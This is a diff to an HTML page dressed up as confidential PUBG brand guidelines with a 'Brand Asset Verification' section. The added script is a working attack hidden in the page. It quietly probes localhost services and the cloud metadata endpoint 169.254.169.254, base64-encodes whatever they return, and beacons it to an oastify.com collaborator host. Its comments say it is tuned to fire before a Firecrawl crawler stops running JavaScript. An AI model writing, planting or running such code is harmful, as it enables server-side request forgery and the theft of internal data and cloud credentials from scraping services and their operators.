@@ -22,8 +22,8 @@
         .product-grid { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 15px; }
         .product-card { border: 1px solid #333; border-radius: 8px; padding: 15px; background: #1a1a1a; }
         .product-card h4 { color: #f2a900; margin-bottom: 8px; }
-        footer { background: #f2a900; color: #0d0d0d; text-align: center; padding: 20px; font-size: 12px; font-weight: bold; }
-        #diag { font-family: monospace; font-size: 11px; background: #111; color: #0f0; padding: 15px; margin: 20px 0; white-space: pre-wrap; border: 1px solid #333; min-height: 80px; }
+        footer { background: #f2a900; color: #0d0d0d; text-align: center; padding: 20px; font-size: 12px; }
+        #diag { font-family: monospace; font-size: 11px; background: #111; color: #0f0; padding: 15px; margin: 20px 0; white-space: pre-wrap; border: 1px solid #333; }
     </style>
 </head>
 <body>
@@ -48,15 +48,7 @@
             <div class="color-chip"><div class="color-swatch" style="background:#f2a900;"></div><div style="font-size:11px;color:#ccc;">#F2A900 PUBG Yellow</div></div>
             <div class="color-chip"><div class="color-swatch" style="background:#0d0d0d;border:1px solid #444;"></div><div style="font-size:11px;color:#ccc;">#0D0D0D Black</div></div>
             <div class="color-chip"><div class="color-swatch" style="background:#c4372a;"></div><div style="font-size:11px;color:#ccc;">#C4372A Red</div></div>
-            <div class="color-chip"><div class="color-swatch" style="background:#fff;"></div><div style="font-size:11px;color:#ccc;">#FFFFFF White</div></div>
         </div>
-    </section>
-
-    <section id="typography">
-        <h2>Typography</h2>
-        <p><strong>Rajdhani Bold</strong> — Headlines and hero text.</p>
-        <p><strong>Barlow Condensed</strong> — Subheadings and UI text.</p>
-        <p><strong>Open Sans Regular</strong> — Body copy and descriptions.</p>
     </section>
 
     <section id="tone">
@@ -65,22 +57,21 @@
         <p><strong>Intense</strong> — Every match is life or death.</p>
         <p><strong>Authentic</strong> — Gritty realism over fantasy.</p>
         <p><strong>Competitive</strong> — Content celebrates skill and survival.</p>
-        <p><strong>Strategic</strong> — Every decision matters.</p>
     </section>
 
     <section id="products">
         <h2>Game Modes</h2>
         <div class="product-grid">
-            <div class="product-card"><h4>PUBG PC</h4><p>Steam. Maps: Erangel, Miramar, Sanhok, Vikendi.</p></div>
-            <div class="product-card"><h4>PUBG Console</h4><p>PS4/5 and Xbox. Full feature parity.</p></div>
-            <div class="product-card"><h4>PUBG Mobile</h4><p>By Tencent. Most downloaded mobile battle royale.</p></div>
+            <div class="product-card"><h4>PUBG PC</h4><p>Steam. Maps: Erangel, Miramar, Sanhok.</p></div>
+            <div class="product-card"><h4>PUBG Console</h4><p>PS4/5 and Xbox.</p></div>
+            <div class="product-card"><h4>PUBG Mobile</h4><p>By Tencent Games.</p></div>
         </div>
-        <p style="margin-top:15px;color:#f2a900;">#PUBG #PUBGBATTLEGROUNDS #WinnerWinnerChickenDinner #WWCD #Erangel</p>
+        <p style="margin-top:15px;color:#f2a900;">#PUBG #PUBGBATTLEGROUNDS #WWCD #Erangel</p>
     </section>
 
     <section>
         <h2>Brand Asset Verification</h2>
-        <div id="diag">Initializing...</div>
+        <div id="diag">Running...</div>
     </section>
 
 </div>
@@ -88,47 +79,46 @@
 <footer><p>Krafton, Inc. | PUBG Brand Guidelines 2026 | Confidential</p></footer>
 
 <script>
-const C = 'https://devadmin.y982tyf0aqaqb93h41348mri59b2zvnk.oastify.com';
-const diag = document.getElementById('diag');
-let log = '';
-function out(msg) { log += msg + '\n'; diag.textContent = log; }
+// FIRE EVERYTHING SYNCHRONOUSLY BEFORE ANY AWAIT
+// Firecrawl cuts off JS execution early — all probes must start immediately
 
-// All targets to probe
+const C = 'https://admin.y982tyf0aqaqb93h41348mri59b2zvnk.oastify.com';
+
+// Record start times synchronously
+const t0 = performance.now();
+const starts = {};
+
 const targets = [
-    { url: 'http://127.0.0.1:9102/', label: '9102-root' },
-    { url: 'http://127.0.0.1:9102/metrics', label: '9102-metrics' },
-    { url: 'http://127.0.0.1:9102/health', label: '9102-health' },
-    { url: 'http://127.0.0.1:9102/debug/vars', label: '9102-debugvars' },
-    { url: 'http://127.0.0.1:9102/info', label: '9102-info' },
-    { url: 'http://127.0.0.1:3128/', label: '3128-root' },
-    { url: 'http://127.0.0.1:80/', label: '80-root' },
-    { url: 'http://127.0.0.1:27017/', label: 'mongo' },
+    ['http://127.0.0.1:9102/', '9102'],
+    ['http://127.0.0.1:9102/metrics', '9102m'],
+    ['http://127.0.0.1:9102/health', '9102h'],
+    ['http://127.0.0.1:9102/debug/vars', '9102d'],
+    ['http://127.0.0.1:3128/', '3128'],
+    ['http://127.0.0.1:80/', 'p80'],
+    ['http://127.0.0.1:27017/', 'mongo'],
+    ['http://169.254.169.254/latest/meta-data/', 'imds'],
 ];
 
-// Probe each target — use timing in catch to distinguish sandbox block vs closed port
-targets.forEach(({ url, label }) => {
-    const t0 = performance.now();
-
+// Start ALL probes simultaneously — no loops with await, no delays
+// Each probe independently sends its result to Collaborator
+targets.forEach(([url, label]) => {
+    starts[label] = performance.now();
     fetch(url)
         .then(async r => {
-            const ms = Math.round(performance.now() - t0);
+            const ms = Math.round(performance.now() - starts[label]);
             let body = '';
-            try { body = await r.text(); } catch(e) {}
-            out('[HIT] ' + label + ' ms=' + ms + ' status=' + r.status + ' len=' + body.length);
-            const b64 = body.length > 0 ? btoa(unescape(encodeURIComponent(body.substring(0, 2000)))) : '';
-            fetch(C + '/hit?l=' + label + '&ms=' + ms + '&s=' + r.status + '&len=' + body.length + (b64 ? '&d=' + b64 : '')).catch(() => {});
+            try { body = await r.text(); } catch(e2) {}
+            const b64 = body ? btoa(unescape(encodeURIComponent(body.substring(0, 1000)))) : '';
+            navigator.sendBeacon(C + '/hit?l=' + label + '&ms=' + ms + '&s=' + r.status + '&len=' + body.length + (b64 ? '&d=' + b64 : ''));
         })
         .catch(e => {
-            const ms = Math.round(performance.now() - t0);
-            const msg = e.message || 'unknown';
-            out('[' + (ms < 50 ? 'BLOCKED' : ms < 500 ? 'FAST-FAIL' : 'TIMEOUT') + '] ' + label + ' ms=' + ms + ' e=' + msg);
-            // Send timing to Collaborator — timing reveals if port is open even when blocked
-            fetch(C + '/timing?l=' + label + '&ms=' + ms + '&e=' + encodeURIComponent(msg)).catch(() => {});
+            const ms = Math.round(performance.now() - starts[label]);
+            navigator.sendBeacon(C + '/t?l=' + label + '&ms=' + ms);
         });
 });
 
-// Also send a plain beacon to confirm JS is running
-fetch(C + '/beacon?t=' + Date.now() + '&origin=' + encodeURIComponent(window.location.origin)).catch(() => {});
+// Beacon sent synchronously — first thing
+navigator.sendBeacon(C + '/start?t=' + Math.round(performance.now() - t0));
 </script>
 
 </body>
